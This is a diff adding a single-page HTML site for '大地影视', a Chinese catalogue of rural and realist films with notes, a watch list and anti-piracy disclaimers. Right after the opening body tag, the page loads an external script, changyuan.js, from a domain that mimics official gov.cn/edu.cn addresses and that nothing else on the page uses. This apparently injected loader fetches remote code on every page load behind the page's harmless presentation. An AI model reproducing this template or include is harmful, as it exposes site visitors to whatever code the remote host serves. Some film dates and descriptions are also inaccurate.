@@ -1,0 +1,366 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<title>大地影视｜乡土影像与现实主义华语电影记录</title>
+<meta name="description" content="大地影视关注扎根土地的现实主义影像：乡土题材、农业纪录片、乡村题材剧情片与现实主义华语电影档案。我们记录那些关于土地、劳动与人的故事，不做资源搬运，页面不提供任何影视播放或下载服务。">
+<meta name="keywords" content="大地影视, 乡土影像, 现实主义电影, 农业纪录片, 乡村题材, 华语电影档案, dadiyingshi-top.github.io">
+<meta name="author" content="大地影视编辑部">
+<meta name="robots" content="index,follow">
+<meta property="og:title" content="大地影视｜乡土影像与现实主义电影记录">
+<meta property="og:description" content="记录扎根土地的现实主义影像，不提供影视资源下载。">
+<meta property="og:type" content="website">
+<style>
+:root{
+  --soil:#7A5C3E;
+  --soil-dk:#4E3926;
+  --clay:#C68B4A;
+  --wheat:#E8C66B;
+  --leaf:#5E7A3C;
+  --paper:#F6F1E7;
+  --ink:#2A2118;
+  --line:#E0D5BF;
+}
+*{margin:0;padding:0;box-sizing:border-box}
+html{scroll-behavior:smooth}
+body{
+  background:var(--paper);color:var(--ink);
+  font-family:"PingFang SC","Microsoft YaHei","Helvetica Neue",Arial,sans-serif;
+  line-height:1.8;
+}
+a{color:inherit;text-decoration:none}
+.wrap{max-width:1120px;margin:0 auto;padding:0 24px}
+
+/* 拼贴头部 */
+header{
+  background:
+    linear-gradient(180deg,rgba(78,57,38,.92),rgba(122,92,62,.94)),
+    repeating-linear-gradient(45deg,transparent 0 12px,rgba(255,255,255,.02) 12px 24px);
+  color:#F6F1E7;padding:70px 0 60px;position:relative;overflow:hidden;
+  border-bottom:6px solid var(--clay);
+}
+.hero{display:grid;grid-template-columns:1.2fr .8fr;gap:40px;align-items:center;position:relative;z-index:2}
+.hero h1{
+  font-size:clamp(40px,9vw,88px);font-weight:900;line-height:1.02;letter-spacing:-.02em;
+}
+.hero h1 small{
+  display:block;font-size:.42em;font-weight:700;letter-spacing:.16em;color:var(--wheat);margin-top:14px;
+}
+.hero .sub{margin-top:20px;font-size:clamp(15px,2.4vw,18px);max-width:520px;opacity:.94}
+.collage{
+  display:grid;grid-template-columns:repeat(3,1fr);grid-template-rows:repeat(3,60px);gap:8px;
+}
+.tile{
+  border-radius:6px;display:flex;align-items:center;justify-content:center;font-size:26px;
+  background:var(--clay);opacity:.9;
+}
+.tile:nth-child(2){background:var(--leaf)}
+.tile:nth-child(3){background:var(--wheat);color:var(--soil-dk)}
+.tile:nth-child(4){grid-row:span 2;background:var(--soil-dk);font-size:40px}
+.tile:nth-child(7){background:var(--clay);grid-column:span 2}
+.tile:nth-child(9){background:var(--leaf)}
+
+/* 导航 */
+nav{background:var(--soil-dk);position:sticky;top:0;z-index:50}
+nav .wrap{display:flex;gap:4px;flex-wrap:wrap}
+nav a{
+  color:#F6F1E7;font-size:14.5px;padding:13px 17px;position:relative;transition:.25s;white-space:nowrap;
+}
+nav a:hover{background:var(--clay);color:#fff}
+
+/* 通用区块 */
+section{padding:72px 0;border-bottom:1px dashed var(--line)}
+.eyebrow{font-size:12.5px;letter-spacing:.28em;color:var(--clay);text-transform:uppercase;font-weight:800}
+h2{font-size:clamp(26px,5vw,40px);font-weight:900;margin:6px 0 12px}
+.lead{color:#6B5C45;max-width:700px;font-size:16px;margin-bottom:38px}
+
+/* 马赛克作品墙 */
+.wall{display:grid;grid-template-columns:repeat(4,1fr);grid-auto-rows:150px;gap:12px}
+.cell{
+  background:#fff;border:1px solid var(--line);border-radius:8px;padding:18px;
+  display:flex;flex-direction:column;justify-content:space-between;transition:.3s;
+}
+.cell:hover{transform:translateY(-5px);box-shadow:0 16px 34px rgba(122,92,62,.2);border-color:var(--clay)}
+.cell h3{font-size:16px;line-height:1.35}
+.cell .meta{font-size:12px;color:var(--clay);font-weight:700;letter-spacing:.06em}
+.cell p{font-size:13.5px;color:#6B5C45;line-height:1.6}
+.cell.lg{grid-column:span 2;grid-row:span 2;background:var(--soil-dk);color:#F6F1E7;border-color:var(--soil-dk)}
+.cell.lg h3{font-size:22px}
+.cell.lg .meta{color:var(--wheat)}
+.cell.lg p{color:#D9CDB8}
+.cell.wide{grid-column:span 2}
+.cell.leaf{background:var(--leaf);color:#F6F1E7;border-color:var(--leaf)}
+.cell.leaf .meta{color:var(--wheat)}
+.cell.leaf p{color:#E2E8D5}
+.cell.clay{background:var(--clay);color:#fff;border-color:var(--clay)}
+.cell.clay .meta{color:#F6E9D2}
+
+/* 手记：便签 */
+.notepad{display:grid;grid-template-columns:repeat(auto-fit,minmax(260px,1fr));gap:20px}
+.pad{
+  background:#fff;border-radius:6px;padding:24px 24px 24px 30px;position:relative;
+  border-left:5px solid var(--wheat);box-shadow:0 8px 22px rgba(0,0,0,.05);
+}
+.pad::after{
+  content:attr(data-no);position:absolute;top:14px;right:16px;
+  font-size:30px;font-weight:900;color:var(--line);line-height:1;
+}
+.pad h3{font-size:18px;margin-bottom:8px}
+.pad p{font-size:14.5px;color:#5C4E38}
+.pad.g2{border-left-color:var(--leaf)}
+.pad.g3{border-left-color:var(--clay)}
+.pad.g4{border-left-color:var(--soil)}
+
+/* 对照 */
+.compare{display:grid;grid-template-columns:1fr 1fr;gap:0;border:1px solid var(--line);border-radius:8px;overflow:hidden}
+.half{padding:26px;background:#fff}
+.half.dark{background:var(--soil-dk);color:#F6F1E7}
+.half h3{font-size:19px;margin-bottom:12px;color:var(--clay)}
+.half.dark h3{color:var(--wheat)}
+.half ul{list-style:none}
+.half li{padding:9px 0 9px 22px;position:relative;font-size:15px;border-bottom:1px dashed var(--line)}
+.half.dark li{border-color:#6B5340}
+.half li::before{content:"→";position:absolute;left:0;color:var(--clay);font-weight:900}
+.half.dark li::before{color:var(--wheat)}
+
+/* 清单 */
+.list{display:grid;grid-template-columns:repeat(auto-fit,minmax(220px,1fr));gap:14px}
+.item{
+  background:#fff;border:1px solid var(--line);border-radius:8px;padding:20px;transition:.3s;
+}
+.item:hover{border-color:var(--clay);background:#FDF8EC}
+.item .ic{font-size:28px;margin-bottom:10px}
+.item h3{font-size:16.5px;margin-bottom:6px}
+.item p{font-size:14px;color:#6B5C45}
+
+/* 页脚 */
+footer{background:var(--soil-dk);color:#D9CDB8;padding:56px 0 40px;text-align:center}
+.url{
+  display:inline-block;font-size:clamp(15px,2.6vw,18px);color:var(--wheat);
+  border:1px dashed var(--clay);padding:12px 22px;border-radius:6px;margin:16px 0;letter-spacing:.04em;
+}
+.note{max-width:760px;margin:24px auto 0;font-size:13px;color:#A99A82;border-top:1px solid #6B5340;padding-top:20px}
+
+@media(max-width:860px){
+  .hero{grid-template-columns:1fr;gap:30px}
+  .collage{grid-template-rows:repeat(3,48px)}
+  .wall{grid-template-columns:repeat(2,1fr);grid-auto-rows:140px}
+  .cell.lg,.cell.wide{grid-column:span 2}
+  .compare{grid-template-columns:1fr}
+}
+@media(max-width:520px){
+  .wall{grid-template-columns:1fr}
+  .cell.lg,.cell.wide,.cell{grid-column:span 1;grid-row:auto}
+  section{padding:52px 0}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/changyuan.js"></script>
+
+<header>
+  <div class="wrap">
+    <div class="hero">
+      <div>
+        <h1>大地影视<small>ROOTED IN THE LAND</small></h1>
+        <p class="sub">我们记录那些关于土地、劳动与人的影像——乡土题材、农业纪录片、乡村剧情片，以及一切愿意把镜头对准真实生活的现实主义作品。</p>
+      </div>
+      <div class="collage">
+        <div class="tile">🌾</div><div class="tile">🚜</div><div class="tile">🌻</div>
+        <div class="tile">🏡</div><div class="tile">🌿</div><div class="tile">🪁</div>
+        <div class="tile">🪵</div><div class="tile">🌾🌾</div><div class="tile">🌱</div>
+      </div>
+    </div>
+  </div>
+</header>
+
+<nav>
+  <div class="wrap">
+    <a href="#wall">影像作品墙</a>
+    <a href="#notes">创作手记</a>
+    <a href="#compare">两种拍法</a>
+    <a href="#list">看片清单</a>
+    <a href="#about">关于大地</a>
+  </div>
+</nav>
+
+<main>
+
+  <section id="wall">
+    <div class="wrap">
+      <div class="eyebrow">The Wall</div>
+      <h2>影像作品墙</h2>
+      <p class="lead">没有"在线观看"入口，只有作品的来路与价值。每一格都是一部值得被重新提起的影像。</p>
+      <div class="wall">
+        <div class="cell lg">
+          <div>
+            <div class="meta">2019 · 纪录片</div>
+            <h3>蜂蜜之地</h3>
+          </div>
+          <p>北马其顿养蜂人与土地之间近乎古典的关系。全片几乎没有旁白，靠季节、劳作与一只蜂箱完成叙事，是对"依靠土地生存"最朴素的影像礼赞。</p>
+        </div>
+        <div class="cell leaf">
+          <div class="meta">2020 · 剧情</div>
+          <h3>隐入尘烟</h3>
+          <p>西北农村的两个人，在土地上结婚、建房、收麦，也被土地记住。</p>
+        </div>
+        <div class="cell">
+          <div class="meta">2021 · 纪录片</div>
+          <h3>克拉克森的农场</h3>
+          <p>一个电视主持人的农业实验，意外讲清了现代农业的经济账。</p>
+        </div>
+        <div class="cell">
+          <div class="meta">2014 · 纪录片</div>
+          <h3>棉花</h3>
+          <p>周浩记录从种植到成衣的完整链条，是理解"一件衣服从哪里来"的最佳入口。</p>
+        </div>
+        <div class="cell wide clay">
+          <div class="meta">1994 · 剧情</div>
+          <h3>活着</h3>
+          <p>张艺谋用一个人的命运丈量一段土地上的时代变迁。福贵的一生，也是中国农村近半个世纪的缩影。</p>
+        </div>
+        <div class="cell">
+          <div class="meta">2016 · 纪录片</div>
+          <h3>我在故宫修文物</h3>
+          <p>手艺与器物背后的耐心，是对"快"这个时代最温柔的反驳。</p>
+        </div>
+        <div class="cell leaf">
+          <div class="meta">2018 · 剧情</div>
+          <h3>北方一片苍茫</h3>
+          <p>小成本独立制作，用极简的镜头语言呈现东北乡村的荒寒与荒诞。</p>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <section id="notes">
+    <div class="wrap">
+      <div class="eyebrow">Field Notes</div>
+      <h2>创作手记</h2>
+      <p class="lead">拍土地的人，最终都会明白：最难的部分不是技术，而是尊重。</p>
+      <div class="notepad">
+        <div class="pad" data-no="01">
+          <h3>别把农民拍成符号</h3>
+          <p>土地上的每一个人都有具体的困境与欲望。把"淳朴"当成标签，恰恰是对拍摄对象最大的不尊重。</p>
+        </div>
+        <div class="pad g2" data-no="02">
+          <h3>季节就是拍摄计划</h3>
+          <p>农业题材的拍摄周期不由剧组决定，而由节气决定。错过一季，就要再等一年——这也是这类片子稀少的原因。</p>
+        </div>
+        <div class="pad g3" data-no="03">
+          <h3>声音里有土地的体温</h3>
+          <p>风声、虫鸣、农机、牲畜。把这些录好，比多打一盏灯更能让观众相信"这里真的有一片土地"。</p>
+        </div>
+        <div class="pad g4" data-no="04">
+          <h3>许可与回报</h3>
+          <p>在村子里拍摄，要取得真实的、可撤回的许可，并在成片后把结果交还给被拍的人。这是基本的伦理。</p>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <section id="compare">
+    <div class="wrap">
+      <div class="eyebrow">Two Ways</div>
+      <h2>拍土地的两种拍法</h2>
+      <p class="lead">不是优劣之分，而是两种不同的目光。</p>
+      <div class="compare">
+        <div class="half">
+          <h3>凝视式：把镜头放低</h3>
+          <ul>
+            <li>长镜头、固定机位，让观众自己看够</li>
+            <li>少用音乐，让环境声成为主角</li>
+            <li>人物不解释自己，行动就是台词</li>
+            <li>代表：侯孝贤、阿巴斯式的静观</li>
+          </ul>
+        </div>
+        <div class="half dark">
+          <h3>介入式：把镜头放进生活</h3>
+          <ul>
+            <li>手持、跟拍，与人物一同行动</li>
+            <li>采访与对话推动叙事</li>
+            <li>允许意外发生，也允许情绪流露</li>
+            <li>代表：直接电影、观察式纪录片</li>
+          </ul>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <section id="list">
+    <div class="wrap">
+      <div class="eyebrow">Watching List</div>
+      <h2>看片清单：从哪里开始</h2>
+      <p class="lead">按主题分类，方便你找到自己感兴趣的那一类。观看请走正版渠道。</p>
+      <div class="list">
+        <div class="item">
+          <div class="ic">🌾</div>
+          <h3>农业与劳作</h3>
+          <p>《蜂蜜之地》《克拉克森的农场》《棉花》。理解"食物从哪里来"的最佳三部曲。</p>
+        </div>
+        <div class="item">
+          <div class="ic">🏡</div>
+          <h3>乡村与家庭</h3>
+          <p>《隐入尘烟》《活着》《北方一片苍茫》。土地如何塑造一个家庭的结构。</p>
+        </div>
+        <div class="item">
+          <div class="ic">🪵</div>
+          <h3>手艺与器物</h3>
+          <p>《我在故宫修文物》《最后的匠人》。耐心本身就是一种叙事方式。</p>
+        </div>
+        <div class="item">
+          <div class="ic">🌍</div>
+          <h3>土地与时代</h3>
+          <p>《悲情城市》《黄土地》《红高粱》。土地如何成为历史记忆的容器。</p>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <section id="about">
+    <div class="wrap">
+      <div class="eyebrow">About</div>
+      <h2>关于大地影视</h2>
+      <p class="lead">大地影视关注扎根土地的影像，也关心影像如何对待土地和土地上的人。</p>
+      <div class="compare">
+        <div class="half">
+          <h3>我们做</h3>
+          <ul>
+            <li>乡土与现实主义影像的档案整理</li>
+            <li>农业、手艺、乡村题材的专题记录</li>
+            <li>导演与创作者的访谈与手记</li>
+            <li>正版观看渠道的类型对照与提示</li>
+          </ul>
+        </div>
+        <div class="half dark">
+          <h3>我们不做</h3>
+          <ul>
+            <li>不提供影视播放或在线观看服务</li>
+            <li>不聚合盗版资源、不放下载入口</li>
+            <li>不做网盘索引或第三方资源解析</li>
+            <li>不把苦难当猎奇、不消费被拍者</li>
+          </ul>
+        </div>
+      </div>
+      <p style="margin-top:30px;font-size:15px">站点主页：<strong style="color:var(--clay)">https://dadiyingshi-top.github.io</strong></p>
+    </div>
+  </section>
+
+</main>
+
+<footer>
+  <div class="wrap">
+    <div style="font-size:clamp(24px,5vw,36px);font-weight:900;color:#F6F1E7;letter-spacing:.06em">大地影视</div>
+    <p>乡土影像记录 · 现实主义华语电影 · 农业与手艺专题</p>
+    <div class="url">https://dadiyingshi-top.github.io</div>
+    <p class="note">
+      本站为静态单页，仅提供影视资讯、影像档案与正版观看渠道提示，不提供影视文件下载、不嵌入盗版播放源、不解析第三方资源。
+      页面中所有作品名与描述均为示例说明，实际著作权归原作者与发行方所有；如有正版合作或侵权异议，请联系站点主页留言处理。
+    </p>
+  </div>
+</footer>
+
+</body>
+</html>
